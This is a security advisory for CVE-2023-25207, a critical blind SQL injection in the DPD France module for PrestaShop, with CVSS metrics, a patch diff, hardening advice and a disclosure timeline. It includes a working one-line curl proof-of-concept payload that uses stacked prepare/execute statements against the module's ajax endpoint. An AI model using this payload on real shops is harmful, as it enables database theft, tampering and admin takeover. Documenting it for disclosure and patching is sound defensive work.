---
layout: post
title: "[CVE-2023-25207] Multiple improper neutralization of SQL parameters in DPD France module for PrestaShop"
categories: modules
author:
- 202-ecommerce.com
- TouchWeb.fr
- Friends-Of-Presta.org
meta: "CVE,PrestaShop,dpdfrance"
severity: "critical (9.8)"
---

In the module "DPD France" (dpdfrance) for PrestaShop, a remote attaker can perform a blind SQL injection in affected versions. Release 6.1.3 fixed vulnerabilities.

## Summary

* **CVE ID**: [CVE-2023-25207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25207)
* **Published at**: 2023-03-09
* **Advisory source**: Friends-of-Presta.org
* **Platform**: PrestaShop
* **Product**: dpdfrance
* **Impacted release**: < 6.1.3
* **Product author**: DPD France SAS
* **Weakness**: [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
* **Severity**: critical (9.8)

## Description

In dpdfrance module for PrestaShop up to 6.1.3, multiple sensitives SQL calls in method `dpdfrance::ajaxSetAddressOrder()` can be executed with a trivial http call and exploited to forge a bind SQL injection.

## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: none
* **User interaction**: none
* **Scope**: unchanged
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Possible malicious usage

* Technical and personal data leaks
* Obtain admin access
* Remove all data of the linked PrestaShop
* Display sensitives tables to front-office to unlock potential admin's ajax scripts of modules protected by token on the ecosystem

## Proof of concept

```bash
curl -v -X POST -d 'action_ajax_dpdfrance=setAddressOrder&order=1%27;select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--' 'https://domain.tld/modules/dpdfrance/ajax.php?dpdfrance_token=EXPOSED_TOKEN_ON_FRONT_OFFICE'
```

## Patch

```diff
--- a/dpdfrance/dpdfrance.php
+++ b/dpdfrance/dpdfrance.php
@@ -977,7 +977,7 @@ class DPDFrance extends CarrierModule
     public function ajaxSetAddressOrder($param)
     {
         $dpdOrder = $this->getDpdOrder($param['order']);
-        $sql      = "UPDATE " . _DB_PREFIX_ . "dpdfrance_order SET override_return_street = '" . (string)$param['street'] . "', override_return_zip = '" . (string)$param['zip'] . "', override_return_city = '" . (string)$param['city'] . "', override_return_phone = '" . (string)$param['phone'] . "' WHERE id_order_dpd = '" . $param['order'] . "';";
+        $sql      = "UPDATE " . _DB_PREFIX_ . "dpdfrance_order SET override_return_street = '" . pSQL($param['street']) . "', override_return_zip = '" . pSQL($param['zip']) . "', override_return_city = '" . pSQL($param['city']) . "', override_return_phone = '" . pSQL($param['phone']) . "' WHERE id_order_dpd = '" . pSQL($param['order']) . "';";
         db::getInstance()->execute($sql);
         $response = ['update' => true];
         $response = json_encode($response);
```

## Other recommendations

**WARNING** Be aware that the version 6.1.3 come with a new sensible problem so you must stay in alert to apply without delay future versions.

* It’s recommended to upgrade the module beyond 6.1.3.
* For PrestaShop 1.6, you need to apply the patch manually.
* Upgrade PrestaShop to the latest version to disable multiquery executions (separated by “;”) - be warned that this functionality **WILL NOT** protect your SHOP against injection SQL which uses the UNION clause to steal data.
* Change the default database prefix `ps_` by a new longer arbitrary prefix. Nevertheless, be warned that this is useless against blackhats with DBA senior skill because of a design vulnerability in DBMS
* Activate OWASP 942's rules on your WAF (Web application firewall), be warned that you will probably break your backoffice and you will need to pre-configure some bypasses against these set of rules.

## Timeline

| Date | Action |
|--|--|
| 2022-12-05 | Issue discovered during a code review by 202 Ecommerce and [TouchWeb](https://www.touchweb.fr) |
| 2022-12-05 | Contact the author |
| 2022-12-20 | Never received a response from the author |
| 2022-12-20 | Contact PrestaShop Addons Team |
| 2023-01-27 | Fix published on addons PrestaShop marketplace for PrestaShop 1.7+ only |
| 2023-01-28 | Request a CVE ID |
| 2023-03-09 | Publication of this security advisory |

## Links

* [PrestaShop addons product page](https://addons.prestashop.com/en/shipping-carriers/19414-dpd-france-delivery.html)
* [DPD France module page](https://www.dpd.com/fr/fr/faq/prestashop/)
* [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2023-25207)
